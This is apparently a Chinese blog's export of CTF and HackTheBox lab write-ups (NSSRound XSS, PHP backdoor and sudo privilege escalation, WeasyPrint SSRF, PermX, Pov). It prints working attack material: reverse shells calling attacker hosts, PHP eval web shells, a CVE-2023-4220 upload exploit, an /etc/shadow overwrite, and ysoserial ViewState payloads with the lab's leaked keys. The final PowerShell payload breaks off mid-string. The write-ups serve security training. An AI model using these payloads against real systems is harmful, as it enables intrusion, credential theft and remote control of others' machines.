<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">//部分关键代码</span><br><span class="line">$contentLines = explode(&quot; &quot;, $comment[&#x27;content&#x27;]);</span><br><span class="line">if (preg_match(&#x27;/^https?:\/\/\S+$/&#x27;, $contentLines[0])) &#123;</span><br><span class="line">    if (preg_match(&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;, $contentLines[0], $matches) &amp;&amp; end($contentLines) === &#x27;/png&#x27;) &#123;</span><br><span class="line">        $urlParts = parse_url($matches[0]);</span><br><span class="line">        if ($urlParts !== false) &#123;</span><br><span class="line">            echo &#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27; . $matches[0] . &#x27;&quot;&gt;&#x27;;</span><br><span class="line">            //.......</span><br><span class="line">        &#125;</span><br><span class="line">        //......</span><br><span class="line">    &#125;</span><br><span class="line">    //......</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>大概就是对评论的图片链接格式的过滤</p>
<p>我们要跳转到元梦之星用到location去跳转，最基础的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152704432.png"></p>
<p>然后按照上文的匹配条件修改一下以及闭合前面的<code>&lt;</code>和<code>&quot;</code>，最终构如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com&quot;&lt;/script&gt;.png /png</span><br></pre></td></tr></table></figure>

<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152541734.png"></p>
<p>成功跳转元梦之星</p>
<p>然后就是如何给门酱一个链接</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314152846028.png"></p>
<p>也就是说需要门酱自己网站的链接去跳转，由于我们通过xss语句已经插入到img的src中实现跳转到元梦之星</p>
<p>所以我们只需要抓包跳转时的界面，就可以得到门酱跳转时的请求参数值</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153152573.png"></p>
<p>拼接上题目路径即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28757/words/?title=cmV2MXZl&amp;content=aHR0cCUzQSUyRiUyRiUyMiUzRSUzQ3NjcmlwdCUzRWRvY3VtZW50LmxvY2F0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyMiUzQyUyRnNjcmlwdCUzRS5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240314153311602.png"></p>
<h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>打开题目提示在&#x2F;root里面，应该是最后要提权</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123434018.png"></p>
<p>按照提示和php开发仓库入侵有关，搜出来刚好是对应题目php版本，可以利用<strong>User-Agentt</strong>头来命令执行 <a href="https://forum.butian.net/index.php/share/553">参考文章</a></p>
<p>我们bp抓包，构造如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/5i781963p2.yicp.fun/58265 0&gt;&amp;1&#x27;&quot;);</span><br></pre></td></tr></table></figure>



<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315123828640.png"></p>
<p>反弹成功，接下来尝试sh脚本提权发现不行</p>
<p>提示说和sudo提权有关，刚刚试了<code>sudo -l -S</code>是需要密码的所以肯定是存在提权漏洞</p>
<p>搜出来<code>CVE-2021-3156</code></p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124217000.png"></p>
<p>nc连接的靶机上传脚本比较麻烦，所以我们写马利用蚁剑上传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;&gt;/var/www/html/shell.php&quot;);</span><br></pre></td></tr></table></figure>

<p><a href="https://gitcode.com/Rvn0xsy/CVE-2021-3156-plus/overview">漏洞exp利用链接</a></p>
<p>上传成功</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124426238.png"></p>
<p>然后再nc连接，成功提权</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124529389.png"></p>
<p>得到flag</p>
<p><img src="/article/NSSRound#18Basicweb%E8%A7%A3%E6%9E%90/image-20240315124558684.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>NSSRound#20 Basic</title>
    <url>/article/NSSRound-20-Basic.html</url>
    <content><![CDATA[<p>Jay17师傅出的题</p>
<span id="more"></span>





<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, &quot;&quot;)</span><br><span class="line">        if is_valid_url(url):</span><br><span class="line">            try:</span><br><span class="line">                html = HTML(url=url)</span><br><span class="line">                pdf = html.write_pdf()</span><br><span class="line">                response = make_response(pdf)</span><br><span class="line">                response.headers[&#x27;Content-Type&#x27;] = &#x27;application/pdf&#x27;</span><br><span class="line">                response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=output.pdf&#x27;</span><br><span class="line"></span><br><span class="line">                return response</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return f&#x27;Error generating PDF&#x27;, 500</span><br><span class="line">        else:</span><br><span class="line">            return f&#x27;Invalid URL! Target web address: &#x27; + url</span><br><span class="line">    else:</span><br><span class="line">        return render_template(&quot;index.html&quot;), 200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>

<p>题目是没有给源码的，我们从题目一步步分析</p>
<p>打开页面，有一个PDF转换器</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401215914318.png"></p>
<p>存在输入URL大概率有SSRF，随便给个vps的发现不行</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401220042448.png"></p>
<p>结合转换器是转换CSDN的，那么路径应该要有CSDN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net</span><br></pre></td></tr></table></figure>

<p>测试成功，我们在vps上开启监听看看</p>
<p>获得信息<code>WeasyPrint 61.2</code></p>
<p><img src="/article/NSSRound-20-Basic/image-20240401220234808.png"></p>
<p><strong>WeasyPrint</strong></p>
<blockquote>
<p>WeasyPrint是一个用于HTML和CSS的可视化渲染引擎，可以将HTML文档导出为打印标准的PDF文件</p>
</blockquote>
<p>我们可以借助HTML的标签实现文件读取 <a href="https://nahamsec.com/posts/my-expense-report-resulted-in-a-server-side-request-forgery-ssrf-on-lyft">参考文章</a></p>
<p>查看源码可以注意到我们能够使用 <code>&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</code>将任何网页或本地文件的内容附加到我们的 PDF 中</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401221004300.png"></p>
<p>前面已经测试过存在SSRF，那么我们在vps上创建link.html文件然后去读取环境变量即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///proc/1/environ&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>回到题目，注意到源代码有个链接</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401223407178.png"></p>
<p>结合css文件我们可以自己构造如下路径，并在vps上创建<code>blog.csdn.net</code>文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.html</span><br></pre></td></tr></table></figure>

<p>结果不行，我们把<code>blog.csdn.net</code>去掉再读发现html没了（应该是被替换成空）</p>
<p>直接双写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5i781963p2.yicp.fun/blog.csdn.net/link.hthtmlml</span><br></pre></td></tr></table></figure>

<p>得到pdf文件后用binwalk分离一下，得到flag</p>
<p><img src="/article/NSSRound-20-Basic/image-20240401225931026.png"></p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>PermX</title>
    <url>/article/PermX-HackTheBox.html</url>
    <content><![CDATA[<p>Chamilo LMS未经身份验证的Big Upload File远程代码执行漏洞</p>
<span id="more"></span>

<h1 id="PermX"><a href="#PermX" class="headerlink" title="PermX"></a>PermX</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描一下端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sC -v 10.10.11.23</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)</span><br><span class="line">|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)</span><br><span class="line">80/tcp open  http</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://permx.htb</span><br></pre></td></tr></table></figure>

<p>发现80端口重定向<code>http://permx.htb</code>，添加域名到<code>/etc/hosts</code></p>
<p>访问80端口，打开页面翻译发现是个学习平台</p>
<p><img src="/article/PermX-HackTheBox/image-20240731112426706.png"></p>
<p>扫一下有没有子域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf  -u &#x27;http://permx.htb&#x27; -H &#x27;host: FUZZ.permx.htb&#x27; -w /home/rev1ve/shentou/dict/zi-yu-ming/subdomains-10000.txt -fc 301,302 -mc all</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731122425531.png"></p>
<p>www子域名没什么东西，添加<code>lms.permx.com</code>到<code>/etc/hosts</code></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接访问，搜索一下是学习管理系统</p>
<p>账号密码都没有，并且尝试admin弱密码也不行</p>
<p><img src="/article/PermX-HackTheBox/image-20240731122654423.png"></p>
<p>开始是在阿里云漏洞库找并没有收获，后面去CVE官网找到可利用漏洞</p>
<p><img src="/article/PermX-HackTheBox/image-20240731133755276.png"></p>
<p>这里网上找了篇利用漏洞的文章，按照文章打就行</p>
<p>先查看下<code>/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code>文件是否存在</p>
<p><img src="/article/PermX-HackTheBox/image-20240731134348096.png"></p>
<p>如果存在的话，就可以允许将任意文件上传到Web根目录下的<code>/main/inc/lib/javascript/bigupload/files</code>目录</p>
<p>写个马上传到文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; &gt; rce.php</span><br><span class="line">curl -F &#x27;bigUploadFile=@rce.php&#x27; &#x27;http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731135130642.png"></p>
<p>访问马的上传路径，成功命令执行</p>
<p><img src="/article/PermX-HackTheBox/image-20240731135608924.png"></p>
<p>直接反弹shell到本机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=system(&quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45LzEwMjggMD4mMQ==|base64 -d|bash&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731141445449.png"></p>
<p>由于是www-data的shell没什么权限，在本机开启http服务</p>
<p>上传linpeas.sh自动化扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.9/linpeas.sh</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731141848352.png"></p>
<p>发现存在数据库敏感信息</p>
<p><img src="/article/PermX-HackTheBox/image-20240731195421768.png"></p>
<p>cat查看一下得到用户名和密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Database connection settings.</span><br><span class="line">$_configuration[&#x27;db_host&#x27;] = &#x27;localhost&#x27;;</span><br><span class="line">$_configuration[&#x27;db_port&#x27;] = &#x27;3306&#x27;;</span><br><span class="line">$_configuration[&#x27;main_database&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_user&#x27;] = &#x27;chamilo&#x27;;</span><br><span class="line">$_configuration[&#x27;db_password&#x27;] = &#x27;03F6lY3uXAP2bkW8&#x27;;</span><br></pre></td></tr></table></figure>

<p>想着连接数据库，不过一直都连不上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u chamilo -p -h localhost</span><br></pre></td></tr></table></figure>

<p>我们查看下<code>/home</code>下对应用户为mtz，尝试用数据库密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh mtz@10.10.11.23</span><br></pre></td></tr></table></figure>

<p>登陆成功，拿到user的flag</p>
<p><img src="/article/PermX-HackTheBox/image-20240731200357748.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>直接<code>sudo -l</code>看看有什么可以用</p>
<p><img src="/article/PermX-HackTheBox/image-20240731200559597.png"></p>
<p>跟进查看一下</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$#</span>&quot;</span> -ne 3 ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Usage: <span class="variable">$0</span> user perm file&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">user=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">perm=<span class="string">&quot;<span class="variable">$2</span>&quot;</span></span><br><span class="line">target=<span class="string">&quot;<span class="variable">$3</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$target</span>&quot;</span> != /home/mtz/* || <span class="string">&quot;<span class="variable">$target</span>&quot;</span> == *..* ]]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Access denied.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if the path is a file</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    /usr/bin/echo <span class="string">&quot;Target must be a file.&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">/usr/bin/sudo /usr/bin/setfacl -m u:<span class="string">&quot;<span class="variable">$user</span>&quot;</span>:<span class="string">&quot;<span class="variable">$perm</span>&quot;</span> <span class="string">&quot;<span class="variable">$target</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>首先判断是否为三个参数，分别为<code>user用户、perm权限、target目标文件</code>，然后<code>$target</code>限制在<code>/home/mtz</code>路径下以及防止目录穿越，最后就是目标必须是文件。其实这段bash脚本就是用于设置文件的访问控制列表 (ACL)</p>
<p>由于root的密码存放在<code>/etc/shadow</code>，虽然限制访问路径和<code>../</code>，但是我们可以创建个指向<code>/etc/</code>，然后修改root用户对应的密码即可提升至root权限</p>
<p>创建软链接，赋予<code>/etc/shadow</code>文件的<code>rwx</code>权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /etc/ exp</span><br><span class="line">sudo /opt/acl.sh mtz  rwx  /home/mtz/exp/shadow</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731204429142.png"></p>
<p>在攻击机加密我们要修改的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl passwd -6  123456</span><br></pre></td></tr></table></figure>

<p><img src="/article/PermX-HackTheBox/image-20240731204020957.png"></p>
<p>最后添加到<code>/etc/shadow</code>里即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;root:$6$vJ2j3Q3CvHdwSUqC$UiU8yKLIxCwz/GEAve5F9dYGk.nxo1gscErZL3bKADldciewmeC/Txk1jUmr2KI2DJS12tS1seUTR988mw12G0:19871:0:99999:7:::&#x27; &gt; /home/mtz/exp/shadow</span><br></pre></td></tr></table></figure>

<p>su切换到root用户，得到root的flag</p>
<p><img src="/article/PermX-HackTheBox/image-20240731204824630.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>CVE-2023-4220漏洞利用</p>
<ul>
<li><a href="https://starlabs.sg/advisories/23/23-4220/">https://starlabs.sg/advisories/23/23-4220/</a></li>
</ul>
<p>靶机wp</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_62621015/article/details/140349984">https://blog.csdn.net/weixin_62621015/article/details/140349984</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
      </tags>
  </entry>
  <entry>
    <title>Pov</title>
    <url>/article/Pov-HackTheBox.html</url>
    <content><![CDATA[<p>AST.NET框架ViewState参数攻击、LFI本地文件包含漏洞、ysoserial反序列化漏洞、SeDebugPrivilege提权</p>
<span id="more"></span>

<h1 id="Pov"><a href="#Pov" class="headerlink" title="Pov"></a>Pov</h1><p><strong>信息搜集</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.251</span><br></pre></td></tr></table></figure>

<p>扫描结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE    VERSION</span><br><span class="line">80/tcp open  tcpwrapped</span><br><span class="line">|_http-title: pov.htb</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD</span><br></pre></td></tr></table></figure>

<p>我们将域名<code>pov.htb</code>添加到<code>/etc/hosts</code>方便访问</p>
<p>打开后发现是企业网站，扫出来子域名<code>dev.pov.htb</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:             http://pov.htb</span><br><span class="line">[+] Method:          GET</span><br><span class="line">[+] Threads:         10</span><br><span class="line">[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">[+] User Agent:      gobuster/3.6</span><br><span class="line">[+] Timeout:         10s</span><br><span class="line">[+] Append Domain:   true</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in VHOST enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]</span><br></pre></td></tr></table></figure>

<p>那么我们修改下<code>/etc/hosts</code>的域名，成功访问</p>
<p>我们注意到有文件下载功能，尝试文件读取</p>
<p><img src="/article/Pov-HackTheBox/image-20240405172354851.png"></p>
<p>但是并不能读取一些常见的敏感文件路径</p>
<p><img src="/article/Pov-HackTheBox/image-20240405173617729.png"></p>
<p>我们利用<code>wappalyzer</code>插件扫描出web框架为<code>AST.NET</code>的4.0版本，并且上述请求中的参数也是相关联</p>
<p><img src="/article/Pov-HackTheBox/image-20240405174707954.png"></p>
<p>网上搜到<code>如何利用__VIEWSTATE</code> <a href="https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------">参考文章</a></p>
<p><strong>什么是 ViewState</strong></p>
<blockquote>
<p>ViewState 是 ASP.NET 中用于维护页面和控制网页数据的默认机制。在呈现页面的 HTML 期间，页面的当前状态和回发期间要保留的值将序列化为 base64 编码的字符串。然后，这些字符串将放置在隐藏的 ViewState 字段中。</p>
</blockquote>
<p>ViewState 信息可以通过以下属性或其组合来表征：</p>
<ul>
<li><p>基数64：当 <code>EnableViewStateMac</code> 和 <code>ViewStateEncryptionMode</code> 属性都设置为 false 时，将使用此格式。</p>
</li>
<li><p>Base64 + MAC（消息认证码）已启用：通过将 <code>EnableViewStateMac</code> 属性设置为 true 来实现 MAC 的激活。这为 ViewState 数据提供完整性验证。</p>
</li>
<li><p>Base64 + 加密：当 <code>ViewStateEncryptionMode</code> 属性设置为 true 时，将应用加密，以确保 ViewState 数据的机密性。</p>
</li>
</ul>
<p>文章提到在版本<code>4.5</code>以及<code>EnableViewStateMac=true &amp; ViewStateEncryptionMode=false</code>情况下，密钥在<code>web.config</code>文件上</p>
<p>（由于<code>../</code>被过滤，直接双写绕过）</p>
<p><img src="/article/Pov-HackTheBox/image-20240405185300956.png"></p>
<p>web.config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.web&gt;</span><br><span class="line">    &lt;customErrors mode=&quot;On&quot; defaultRedirect=&quot;default.aspx&quot; /&gt;</span><br><span class="line">    &lt;httpRuntime targetFramework=&quot;4.5&quot; /&gt;</span><br><span class="line">    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; validation=&quot;SHA1&quot; validationKey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot; /&gt;</span><br><span class="line">  &lt;/system.web&gt;</span><br><span class="line">    &lt;system.webServer&gt;</span><br><span class="line">        &lt;httpErrors&gt;</span><br><span class="line">            &lt;remove statusCode=&quot;403&quot; subStatusCode=&quot;-1&quot; /&gt;</span><br><span class="line">            &lt;error statusCode=&quot;403&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;http://dev.pov.htb:8080/portfolio&quot; responseMode=&quot;Redirect&quot; /&gt;</span><br><span class="line">        &lt;/httpErrors&gt;</span><br><span class="line">        &lt;httpRedirect enabled=&quot;true&quot; destination=&quot;http://dev.pov.htb/portfolio&quot; exactDestination=&quot;false&quot; childOnly=&quot;true&quot; /&gt;</span><br><span class="line">    &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用 YSoSerial.Net 攻击 <a href="https://github.com/pwntester/ysoserial.net">工具链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping 10.10.14.46&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>

<p>注意：如果有发送参数 <code>_VIEWSTATEGENERATOR</code> ，用 <code>--generator=8E0F0FA3</code> 替换<code>--apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot;</code>。实际上bp抓包可以看到确实有，但是换成<code>--generator</code>参数却不行</p>
<p>在windows系统生成payload</p>
<p><img src="/article/Pov-HackTheBox/image-20240405192312405.png"></p>
<p>复制到bp上，并且在本地监听tun0（即10.10.14.46）的流量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i tun0 icmp</span><br></pre></td></tr></table></figure>

<p>成功命令执行</p>
<p><img src="/article/Pov-HackTheBox/image-20240405192620484.png"></p>
<p>经过一番尝试，发现bash的反弹shell无法成功，那么猜测是目标机器为windows</p>
<p>用powershell去弹 <a href="https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py">脚本链接</a></p>
<p><img src="/article/Pov-HackTheBox/image-20240405194230876.png"></p>
<p>然后再生成payload放到bp上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANAA2ACIALAAxADAAMgA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAAp